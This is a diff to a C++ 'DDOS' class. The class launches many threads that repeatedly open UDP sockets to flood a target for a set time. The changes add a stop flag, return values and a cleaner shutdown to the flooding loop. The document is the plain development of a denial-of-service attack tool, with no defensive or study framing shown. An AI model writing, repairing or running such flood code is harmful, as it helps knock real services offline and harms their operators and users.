@@ -17,7 +17,7 @@ MAX_SUPER_INT DDOS::getFrequency() {
 
 void* DDOS::goSocket(void *object) {
   DDOS *mockingSocket = (DDOS *) object;
-  while (true) {
+  while (mockingSocket->propageSocket) {
     SOCKADDR_IN sin;
     SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock == INVALID_SOCKET) {
@@ -31,6 +31,7 @@ void* DDOS::goSocket(void *object) {
     }
     close(sock);
   }
+  return object;
 }
 
 void DDOS::attack() {
@@ -39,6 +40,7 @@ void DDOS::attack() {
     this->stop();
   }
 
+  this->propageSocket = true;
   this->threadTime = thread(DDOS::methodTime, this);
   for (MAX_SUPER_INT i = 0; i < this->frequency; i++) {
     this->threads.emplace_back(DDOS::goSocket, this);
@@ -53,13 +55,16 @@ void* DDOS::methodTime(void *object) {
   sleep(mockingTime->timeDDOS);
   mockingTime->stop();
   mockingTime->threadTime.join();
+  return object;
 }
 
 void DDOS::stop() {
+  this->propageSocket = false;
   for (auto& t : this->threads) {
       t.join();
   }
   this->threads.clear();
+
   BOOTSTRAP_THREADS
   exit(0);
 }
